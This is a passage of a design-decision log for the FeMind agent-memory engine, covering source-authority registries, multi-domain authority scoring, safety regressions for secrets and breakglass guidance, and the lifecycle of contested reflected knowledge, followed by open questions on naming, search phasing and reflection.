alternatives. That was too weak for cases where a record is trustworthy in
general, yet not the authoritative source for the exact domain being asked
about. Two important real-world cases exposed the gap:
- runtime guidance versus deployment/bootstrap guidance on the same GPU host
- reflected stable procedures where competing trusted chains had different
  domain ownership

The goal was not to invent another flat score tweak. FeMind needed an explicit
authority model that could survive both direct retrieval and deterministic
reflection.

**Consequences:**
- records can now carry source-chain authority metadata:
  - `source_authority_domain`
  - `source_authority_level`
  - `source_chain`
- FeMind now infers an authority domain from high-stakes procedural and
  stable-knowledge queries
- the default composite scorer now includes authority-aware query-time scoring
- direct evidence selection now lets authoritative runtime/security/networking
  chains outrank stronger generic provenance when the query domain is explicit
- deterministic reflection now uses the same authority signal, so reflected
  knowledge objects can prefer the authoritative chain for a domain instead of
  only the cluster with the most generic support
- practical coverage now includes:
  - authoritative runtime-chain retrieval conflicts
  - authoritative runtime-chain reflection conflicts
- the practical harness now treats the top authoritative answer as the contract
  rather than requiring every weaker alternate hit to vanish from the wider hit
  list
- Remote-GPU validation is green after the change:
  practical `50/50` exact, practical `50/50` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 051: Add an Application-Facing Source Authority Registry

**Decision:** Add `SourceAuthorityRegistry` as an engine-level policy object so
applications can declare authoritative source chains per domain once, instead
of requiring every memory row to repeat full authority metadata.

**Context:** Decision 050 established source-chain authority above generic
provenance, but the initial contract was still too record-centric. That was
workable for synthetic eval rows, yet too repetitive for real applications.
Production apps need to say things like "the `runtime-ops` chain is
authoritative for runtime questions" one time at engine build, then let stored
records participate through `source_chain` metadata alone. The registry also
needed to compose correctly with per-record authority metadata instead of
silently replacing it.

**Consequences:**
- FeMind now exposes an application-facing authority registry through the
  engine builder:
  - `authority_registry(...)`
  - `authority_registry_arc(...)`
  - `authority_policy(...)`
  - `authoritative_source_chain(...)`
  - `primary_source_chain(...)`
- `MemoryEngine` now exposes the active registry through
  `authority_registry()`
- the default composite scorer, routed search builder, direct evidence
  selection, trusted-guidance filtering, and deterministic reflection all use
  the same shared registry
- authority can now come from either:
  - per-record metadata (`source_authority_domain`, `source_authority_level`)
  - the application registry plus `source_chain`
- when both apply, FeMind uses the stronger authority level for the inferred
  query domain
- targeted engine tests now prove:
  - builder-configured registry policies are visible at runtime
  - authoritative runtime selection still works when records carry only
    `source_chain`
- broad Remote-GPU regression validation must remain green after the change:
  practical exact, practical ANN, live-library exact, and memloft-slice exact

## Decision 052: Expand Practical Coverage for Mixed-Authority Multi-Hop Retrieval

**Decision:** Extend the engine-first practical suite so it can assert routed
graph depth directly and cover a mixed-authority multi-hop case where graph
expansion surfaces both runtime and deployment guidance, but the authoritative
runtime chain must still win the answer.

**Context:** FeMind already had separate coverage for:
- graph-linked retrieval
- source-chain authority arbitration

But that left a real-world gap. Production memory questions often do both at
once: follow linked notes across multiple hops and then choose the right
authoritative chain inside the expanded evidence set. Without that regression,
it would be too easy to keep both features green independently while missing
their interaction.

The first version of the new scenario exposed exactly that kind of testing
mistake. FeMind returned the correct top answer from the authoritative runtime
chain, but the scenario incorrectly failed because graph-expanded weaker
deployment evidence was still visible lower in the observed hit list. The right
contract is not "hide every weaker connected note." The right contract is:
- route through graph expansion
- surface the correct top answer
- keep the authoritative runtime chain above linked deployment guidance

**Consequences:**
- practical retrieval checks can now assert routed graph depth through
  `expected_graph_depth`
- `graph-client-connectivity` now proves routed `graph_depth = 2`
- the new `graph-authoritative-runtime-path` scenario now proves:
  - graph-linked client questions can trigger routed graph expansion
  - the authoritative runtime chain still wins after both runtime and
    deployment guidance are pulled into the graph-expanded evidence set
- the scenario contract now focuses on top-answer correctness plus routed graph
  depth instead of requiring every weaker connected note to disappear from the
  wider evidence list
- Remote-GPU validation is green after the change:
  practical `51/51` exact, practical `51/51` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 053: Route Private-Infra Graph Questions as Exact Detail

**Decision:** Treat approved or supported private-infrastructure guidance
queries as exact-detail procedural retrieval even when the scope and target
terms are separated, for example `private ... endpoint` or `internal ...
subnet`.

**Context:** The new mixed-authority graph regressions exposed a real routing
gap. FeMind already knew how to:
- expand graph-linked evidence
- prefer verified or authoritative sensitive guidance over weaker alternatives
- redact private endpoint and private network values in the final answer

But the router was still classifying questions like:
- `How does the FeMind tunnel reach the approved private relay endpoint now?`
- `How does the GPU relay connect to the approved internal subnet now?`

as `general` instead of `exact-detail`.

That meant strict grounding never turned on, so the top result could stay a
semantic bridge note even after graph expansion had pulled the verified
procedural note into the candidate set.

**Consequences:**
- private endpoint / hostname / subnet / network-range guidance now counts as
  procedural guidance directly
- approved/supported private-infra targets now trigger the exact-detail route
  and strict grounding path even if the query does not use the literal phrase
  `private endpoint`
- the practical suite now asserts `expected_intent = exact-detail` for the new
  graph-linked private endpoint and private network cases
- both new graph-linked safety regressions now pass for the right reason:
  routing plus grounding, not scenario weakening
- Remote-GPU validation is green after the change:
  practical `54/54` exact, practical `54/54` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 054: Add App-Facing Authority Defaults by Source Kind

**Decision:** Extend `SourceAuthorityRegistry` so applications can declare
authority by query domain and `source_kind`, not only by `source_chain`.

**Context:** FeMind already supported centralized source-chain authority
policies, which solved the case where records were tagged with a stable
authority chain but not full per-record authority levels. That still left a
practical gap for real apps:
- many records already carry `source_kind`
- many apps can declare domain defaults for kinds like `system`,
  `project-doc`, or `maintainer`
- those apps should not need to synthesize artificial `source_chain` values
  onto every record just to participate in domain-aware authority arbitration

**Consequences:**
- `SourceAuthorityRegistry` now supports `source_kind` policies in addition to
  `source_chain` policies
- the engine builder now exposes:
  - `authority_kind_policy(...)`
  - `authoritative_source_kind(...)`
  - `primary_source_kind(...)`
- authority resolution now uses the strongest applicable level from:
  - record metadata
  - app-provided chain policy
  - app-provided kind policy
- the practical suite now includes `registry-kind-runtime-authority`, which
  proves a runtime answer can win from app policy alone even when the records
  carry no `source_chain` metadata
- targeted engine tests now cover registry-backed kind promotion and mixed
  chain-vs-kind precedence
- Remote-GPU validation is green after the change:
  practical `55/55` exact, practical `55/55` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 055: Validate Provenance Ordering Inside Source-Kind Authority Defaults

**Decision:** Extend the practical suite so app-facing `source_kind`
authority defaults are validated not only for top-level authority selection,
but also for provenance-sensitive ordering inside the same authoritative kind.

**Context:** Decision 054 established that apps can promote authority by
domain and `source_kind`, which made it possible for runtime guidance to win
without `source_chain` metadata. That still left an important quality
question:
- if two records share the same authoritative source kind,
- and one is `partially-verified` while the other is only `relayed`,
- app policy must not flatten those two into equivalent answers

The practical gap mattered because real operational memory often has exactly
that shape during migrations: the same trusted maintainer lane may contain both
current partially-verified guidance and older relayed notes.

**Consequences:**
- the practical suite now includes `registry-kind-networking-provenance`
- that scenario proves three things at once:
  - app-facing `source_kind` policy can outrank a lower-authority verified
    project doc
  - provenance still orders records inside the authoritative maintainer lane
  - `partially-verified` networking guidance beats `relayed` guidance instead
    of collapsing into the same answer quality
- no new engine heuristic was needed; the existing authority + provenance math
  was already correct, and the value of this pass is the new permanent
  regression coverage
- Remote-GPU validation is green after the change:
  practical `56/56` exact, practical `56/56` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 056: Add Authority-Domain Policy Objects for App Defaults

**Decision:** Add a grouped `SourceAuthorityDomainPolicy` object so apps can
declare broader authority defaults for one domain at a time instead of stacking
individual kind and chain entries manually.

**Context:** FeMind already supported centralized authority by:
- `source_chain`
- `source_kind`

That solved the raw capability gap, but the application-facing policy surface
was still too low-level:
- apps had to repeat multiple builder calls for one domain
- scenario configs had no way to express a whole domain policy block cleanly
- the engine needed a durable way to represent "runtime defaults" or
  "networking defaults" as one coherent unit

**Consequences:**
- `SourceAuthorityRegistry` now accepts `SourceAuthorityDomainPolicy`
- the engine builder now exposes `authority_domain_policy(...)`
- practical scenarios can now declare grouped domain defaults with
  `authority_domain_policies`
- the practical suite now includes `registry-domain-runtime-authority`, which
  proves a whole runtime-domain policy block can promote the current supported
  runtime answer without per-record `source_chain` metadata
- Remote-GPU validation is green after the change:
  practical `57/57` exact, practical `57/57` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 057: Score Query Authority Across Multiple Relevant Domains

**Decision:** When a query contains cues from more than one authority domain,
FeMind should score candidates against all relevant domains instead of
collapsing authority arbitration to the first matched keyword family.

**Context:** Decision 056 gave applications a grouped domain-policy surface,
but query-time arbitration still had a structural blind spot:
- `infer_authority_domain(...)` returned only one domain
- mixed runtime + networking queries like `supported runtime path` plus
  `private endpoint` could zero out the runtime authority lane
- the practical suite needed a real regression for linked mixed-domain cases,
  not just domain-isolated authority scenarios

**Consequences:**
- query-time authority scoring now considers all relevant inferred domains
  for:
  - composite authority scoring
  - procedural conflict resolution
  - evidence selection
  - trusted sensitive-guidance filtering
- the practical suite now includes
  `registry-domain-cross-runtime-networking`
- that scenario proves a linked query can mention both:
  - runtime path language
  - private-endpoint networking language
  and still surface the authoritative runtime answer
- new unit coverage now locks:
  - multi-domain inference
  - strongest-domain rank selection
- Remote-GPU validation is green after the change:
  practical `58/58` exact, practical `58/58` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 058: Add Mixed-Domain Safety Regressions for Runtime Overlaps

**Decision:** Extend the engine-first suite with explicit mixed-domain safety
coverage so runtime language cannot weaken security guardrails or maintenance
review routing.

**Context:** Decision 057 proved that runtime and networking authority can
coexist in one query, but the next real risk was higher-stakes overlap:
- runtime + security, where secret-value abstention must still win
- runtime + maintenance, where approved breakglass guidance must surface only
  for explicit outage recovery and stay out of normal runtime answers

Those are exactly the kinds of cross-domain queries production apps will see
when operators phrase one question in terms of both service runtime and
incident response.

**Consequences:**
- the practical suite now includes:
  - `credential-runtime-overlap-guardrails`
  - `breakglass-runtime-overlap-routing`
- those scenarios prove:
  - mixed runtime/security wording still returns safe token-loading guidance
    while abstaining on exact secret values
  - mixed runtime/maintenance wording still surfaces the approved temporary
    breakglass path only for explicit recovery queries
  - the same exception remains suppressed for ordinary runtime questions
- this pass did not require another engine change beyond the multi-domain
  authority work; the value is the permanent regression coverage
- Remote-GPU validation is green after the change:
  practical `62/62` exact, practical `62/62` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 059: Add Negative Operational-Memory Regressions

**Decision:** Extend the engine-first suite with stale and contradicted
operational-guidance coverage, and harden retrieval/composition so current
answers do not get trapped on older literal matches.

**Context:** After mixed-domain safety coverage, the next real operational risk
was not a missing domain policy. It was negative memory quality:
- an older trusted secret-location note still surfacing after a newer verified
  path replaced it
- an older approved breakglass path lingering after a newer revocation and
  replacement
- an older maintenance bypass continuing to look usable after it had been
  retired

Those are the kinds of failures that become dangerous in production because the
wrong memory can still look highly relevant even when the current answer is no
longer the literal string the query mentions.

**Consequences:**
- the practical suite now includes:
  - `stale-secret-location-rotation`
  - `revoked-breakglass-recovery-path`
  - `retired-maintenance-bypass-path`
- exact-detail routes now preserve current/historical bias when the query asks
  for a precise current or earlier detail
- current/historical retrieval can now inject linked supersession neighbors
  when only one side of the state pair was initially retrieved
- procedural guidance detection now covers normal `runtime path` / `should be
  used` questions so conflict resolution can run on real maintainer phrasing
- yes/no composition now prefers newer revocation evidence for current
  applicability questions instead of over-valuing the older literal match
- Remote-GPU validation is green after the change:
  practical `68/68` exact, practical `68/68` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 060: Add Reflection Refresh Lifecycle Regressions

**Decision:** Extend the engine-first practical harness so persisted reflection
lifecycle can be validated end to end after a second evidence phase, not only
through unit tests.

**Context:** FeMind already had application-facing reflection refresh planning
and execution through `ReflectionRefreshPolicy`, but the practical harness only
covered one-pass reflection. That left an important gap between engine unit
tests and real-world regression coverage:
- stronger authoritative follow-up evidence could change a reflected summary
  without any practical scenario proving it
- support weakening and retirement were only covered in direct engine tests
- the engine-first loop could validate the existence of a reflection API, but
  not whether persisted reflected rows actually refreshed or retired after
  realistic follow-up evidence

For a production memory engine, reflection quality needs the same durable
scenario coverage as retrieval, authority, and safety.

**Consequences:**
- the practical harness now supports:
  - `reflection_followup_records`
  - `reflection_followup_mutations`
  - `reflection_refresh`
  - `reflection_refresh_checks`
- practical scenarios can now:
  - add follow-up evidence after an initial persisted reflection pass
  - mutate supporting records so support genuinely weakens or disappears
  - assert refresh-plan action/reasons
  - assert the persisted lifecycle state after refresh execution
- the engine-first suite now includes:
  - `reflection-refresh-runtime-authority-update`
  - `reflection-refresh-support-weakened`
  - `reflection-refresh-retire-no-longer-qualified`
- Remote-GPU validation is green after the change:
  practical `73/73` exact, practical `73/73` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 061: Refresh Reflections On Authority And Provenance Drift

**Decision:** Treat `knowledge_key` as the canonical authority-domain hint for
reflected knowledge when it carries one, and refresh persisted reflections when
authority or provenance materially changes even if the derived summary text
does not.

**Context:** Decision 060 added end-to-end reflection refresh coverage, but the
first pass still had a real blind spot:
- a reflected summary could stay textually identical while the underlying
  support became more authoritative or less trustworthy
- reflection ranking still let incidental summary wording pull in the wrong
  domain, so a deployment-heavy phrasing could outweigh a runtime-authoritative
  source chain for the same knowledge key
- the practical suite could not yet prove that same-summary authority or
  provenance drift would trigger a refresh

For a production memory engine, reflected knowledge quality cannot be keyed
only to changed text or raw support counts. The supporting authority and
provenance profile matters too.

**Consequences:**
- reflection candidate authority now prefers domains inferred from
  `knowledge_key` before falling back to summary or source text
- reflected objects and persisted reflection summaries now carry:
  - `authoritative_support_count`
  - `authority_score_sum`
  - `provenance_score_sum`
- refresh planning can now emit:
  - `authority-strengthened`
  - `authority-weakened`
  - `provenance-strengthened`
  - `provenance-weakened`
- the practical harness now supports:
  - `min_authoritative_support_count` in `reflection_checks`
  - same-summary lifecycle scenarios where only the authority or provenance
    profile changes
- the engine-first suite now includes:
  - `reflection-refresh-authority-strengthened-same-summary`
  - `reflection-refresh-provenance-weakened-same-summary`
- Remote-GPU validation is green after the change:
  practical `77/77` exact, practical `77/77` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 062: Make Reflection Authority Scoring Multi-Domain

**Decision:** For deterministic reflection, accumulate authority score across
all inferred authority domains instead of using only the strongest single
domain match, and extend the engine-first practical suite to prove same-summary
authority drift under app-facing domain policy.

**Context:** Decision 061 made reflected knowledge refresh on authority and
provenance drift, but reflection still reduced each supporting record to a
single strongest authority rank. That left a deeper gap:
- reflected keys such as runtime startup paths implicitly span multiple domains
  like `runtime` and `deployment`
- app-facing `SourceAuthorityDomainPolicy` defaults could already shape
  retrieval, but reflection did not yet reward broader matching domain
  coverage across those same domains
- same-summary lifecycle cases could still miss a meaningful shift from
  deployment-heavy support to runtime-scoped support if both records had one
  equally strong single-domain rank

For a production memory engine, reflected knowledge should notice when a
summary becomes better grounded across the full domain profile of the fact
family, not only when its best single-domain match changes.

**Consequences:**
- reflection candidate authority now uses a summed multi-domain score via
  `source_authority_score_sum_for_domains(...)`
- `authoritative_support_count` now counts only truly authoritative supporting
  records, not any nonzero authority match
- practical reflection checks can now assert:
  - `min_authority_score_sum`
  - `min_provenance_score_sum`
- the engine-first suite now includes multi-domain same-summary lifecycle
  coverage under app-facing domain policy:
  - `reflection-refresh-domain-policy-authority-strengthened-same-summary`
  - `reflection-refresh-domain-policy-authority-weakened-same-summary`
  - `reflection-refresh-domain-policy-provenance-weakened-same-summary`
- Remote-GPU validation is green after the change:
  practical `83/83` exact, practical `83/83` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 063: Treat Unresolved Authoritative Reflection Conflict Explicitly

**Date:** 2026-03-31

**Decision:** Add an explicit unresolved-authority-conflict state to
deterministic reflection lifecycle, and let applications choose whether
equally strong authoritative disagreement should keep the current reflected
summary contested or retire it entirely.

**Context:** Decision 062 made reflection authority scoring multi-domain, but
the lifecycle still assumed there would always be a single strongest winner
once authority and provenance were summed. That left a real production gap:
- two different authoritative domain policies could remain in unresolved
  disagreement over the same `knowledge_key`
- the current reflection lifecycle could describe that as “competing” but not
  model it as its own durable state
- applications had no policy control over whether a contested current summary
  was acceptable or whether persisted reflection should retire until the
  conflict was resolved

For a top-tier memory engine, reflected knowledge should not silently pretend a
winner exists when equally strong authoritative chains remain in live conflict.

**Consequences:**
- reflected knowledge objects and persisted reflection summaries now carry
  `unresolved_authority_conflict`
- refresh planning can now emit
  `ReflectionRefreshReason::UnresolvedAuthoritativeConflict`
- `ReflectionRefreshPolicy` now includes:
  - `retire_when_unresolved_authority_conflict`
- when that policy is `false`, FeMind can keep the current reflected summary
  but mark it contested under equal-strength authoritative disagreement
- when that policy is `true`, FeMind can retire the persisted reflection
  instead of leaving any summary current
- the engine-first practical suite now includes:
  - `reflection-refresh-domain-policy-unresolved-conflict-persist`
  - `reflection-refresh-domain-policy-unresolved-conflict-retire`
- Remote-GPU validation is green after the change:
  practical `86/86` exact, practical `86/86` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 064: Keep Unchanged Reflection Conflict Stable

**Date:** 2026-03-31

**Decision:** Promote unresolved authoritative disagreement from a boolean
detail on current reflected rows into an explicit active lifecycle state, and
make unchanged contested disagreement a no-op refresh outcome instead of
repeatedly generating refresh work.

**Context:** Decision 063 added unresolved-authority conflict detection and a
policy choice between keeping a contested summary or retiring it. That still
left one practical gap:
- persisted reflection rows still looked like ordinary `current` rows even
  when their real lifecycle state was “live but disputed”
- application-facing lookup treated only `current` rows as active, so contested
  reflection was not first-class in the public API
- the refresh harness could prove that contested disagreement could be created,
  but not that unchanged disagreement would remain stable without creating
  churn on every refresh pass

For a production memory engine, “still contested” is a real stable state, not
just a temporary flag on a winner row.

**Consequences:**
- `ReflectionLifecycleStatus` now includes:
  - `Contested`
- persisted reflected rows now store `reflection_status=contested` when the
  winning reflected summary remains active but unresolved authoritative
  disagreement exists
- application-facing active reflection lookups and stable-summary retrieval now
  treat both `current` and `contested` rows as live reflection state
- the practical harness now supports `expected_action: "none"` in
  `reflection_refresh_checks`, so scenarios can prove that no refresh-plan item
  is the correct outcome
- the engine-first suite now includes:
  - `reflection-refresh-domain-policy-unresolved-conflict-stable-contested`
- Remote-GPU validation is green after the change:
  practical `88/88` exact, practical `88/88` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 065: Compose Contested Stable Summaries Explicitly

**Date:** 2026-03-31

**Decision:** When a stable-summary query lands on an active contested
reflected row, compose an explicit “still contested” answer instead of only
returning the current winner text with lowered confidence.

**Context:** Decision 064 made contested reflection a first-class active
lifecycle state, but composition still treated those rows like ordinary
reflected summaries. That left one important quality gap:
- a contested reflected row was visible in storage and search, but the final
  answer still looked like an unqualified winner unless the caller inspected
  metadata separately
- the practical suite could prove contested lifecycle state, but not that
  users would actually see the disagreement in the composed answer
- stable-summary routing also needed to stay grounded: reflected stable-summary
  queries should be able to bypass literal top-hit grounding only when an
  active reflected row actually exists, not for any source-only stable-summary
  query

For a top-tier memory engine, contested knowledge should be explicit at answer
time, not only in persistence metadata.

**Consequences:**
- stable-summary composition now has a dedicated contested reflected path:
  - the answer can say the summary is still contested
  - the answer can surface both the current reflected summary and the strongest
    competing authoritative summary
- the strict-grounding exemption for stable-summary composition is now narrow:
  it only applies when an active reflected row is present
- the engine-first practical suite now proves this behavior in the contested
  reflection lifecycle scenario through a real stable-summary retrieval query
- targeted engine coverage now includes:
  - `compose_answer_surfaces_contested_reflection_state_explicitly`
- Remote-GPU validation is green after the change:
  practical `89/89` exact, practical `89/89` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 066: Make Contested Stable-Summary Composition Domain-Policy-Aware

**Date:** 2026-04-01

**Decision:** Extend app-facing authority-domain policy so contested
stable-summary answers can be configured per domain to either:
- surface the explicit contested answer
- surface the current winner plus a conflict note
- or abstain until the disagreement is resolved

**Context:** Decision 065 made contested reflected knowledge explicit at answer
time, but it still treated every domain the same. That was not enough for
production applications:
- some domains need user-facing continuity even when authoritative sources are
  unresolved, so a winner plus conflict note is preferable
- some domains are too sensitive to present any winner while disagreement
  remains, so the right answer is an intentional abstention
- the practical harness could prove contested composition generally, but not
  that application policy actually changed the composed result

For a top-tier memory engine, contested knowledge must be composable under app
policy, not only under a single engine default.

**Consequences:**
- `SourceAuthorityDomainPolicy` now supports
  `with_contested_summary_policy(...)`
- `MemoryEngineBuilder` now exposes `contested_summary_policy(...)` as a
  convenience surface
- contested composition is now resolved across all relevant authority domains
  for the reflected key and query, using the strictest matching policy when
  multiple domains apply
- stable-summary composition can now produce three domain-policy-aware
  outcomes for contested reflected knowledge:
  - `contested-reflected-summary`
  - `winner-with-conflict-note`
  - `contested-abstain-policy`
- the practical harness now supports:
  - `expected_composed_rationale`
  - `expected_abstained`
- the engine-first suite now includes:
  - `reflection-contested-runtime-winner-note`
  - `reflection-contested-runtime-abstain-until-resolved`
- Remote-GPU validation is green after the change:
  practical `93/93` exact, practical `93/93` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 067: Make Contested Citation Detail Domain-Policy-Aware

**Date:** 2026-04-01

**Decision:** Extend app-facing authority-domain policy so contested
stable-summary answers can independently control how much contested detail they
surface:
- cite both sides
- cite only the current winner
- or suppress supporting detail entirely

**Context:** Decision 066 made contested stable-summary outcomes
application-facing, but it still assumed one answer-detail level for every
domain. That left a practical gap:
- some domains can tolerate explicit competing-summary detail
- some domains should preserve only the current leading guidance while still
  acknowledging conflict
- some higher-risk domains should keep the answer shape but suppress competing
  and supporting detail entirely

For a production memory engine, contested-answer policy needs two layers:
what kind of answer to return, and how much contested detail to expose inside
that answer.

**Consequences:**
- `SourceAuthorityDomainPolicy` now supports
  `with_contested_citation_policy(...)`
- `MemoryEngineBuilder` now exposes `contested_citation_policy(...)`
- contested citation policy is resolved across all relevant authority domains
  for the reflected key and query, using the strictest matching policy when
  multiple domains apply
- contested composition can now independently:
  - hide the competing authoritative summary while keeping the explicit
    contested answer shape
  - suppress `Supported by:` detail even on evidence-seeking questions
  - keep abstention text generic instead of surfacing both competing summaries
- the practical suite now includes:
  - `reflection-contested-runtime-cite-winner-only`
  - `reflection-contested-runtime-suppress-supporting-detail`
- targeted engine coverage now includes:
  - `compose_answer_can_hide_competing_summary_when_citation_policy_prefers_winner_only`
  - `compose_answer_can_suppress_supporting_detail_for_contested_winner_note`
- Remote-GPU validation is green after the change:
  practical `97/97` exact, practical `97/97` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Open Questions

### Q1: Crate Naming and Publishing

**Status:** Superseded — renamed to `femind` for suite alignment

The project started under an earlier temporary public name, with placeholder publication and repository setup done before the suite naming settled. The active suite name is now `femind`. If JS/WASM bindings are published, use a scoped package name aligned with `femind`.

### Q2: FTS5 + Hybrid Search Phasing

**Status:** Planned

- **Phase 1:** FTS5 + WAL + Porter stemming (proven in production)
- **Phase 2:** Add hybrid vector search via `vector-search` feature
- **Phase 3:** Add graph memory via `graph-memory` feature

No architecture changes needed between phases — just enable feature flags.

### Q3: Beliefs Memory Type

**Status:** Deferred to post-v1

The three existing types (Episodic/Semantic/Procedural) cover all common agent memory patterns. Beliefs would add complexity (confidence scores, provenance chains, challenge/revision semantics) for a pattern only demonstrated in Hindsight. The `metadata` field on `MemoryRecord` can carry confidence and provenance data ad-hoc until the pattern proves itself in real usage. Revisit after v1.0 ships and consumer feedback is available.

### Q4: Reflection Operation

**Status:** Partially implemented — deterministic pass shipped (Decision 042)

FeMind now has a deterministic, metadata-assisted reflection pass through
`reflect_knowledge_objects(&ReflectionConfig)` and an opt-in persistence
contract through `persist_reflected_knowledge_objects_with(...)`. The current
implementation persists only consumer-built reflection records; FeMind still
does not invent its own hidden derived record format. Optional LLM-assisted
reflection remains future work.
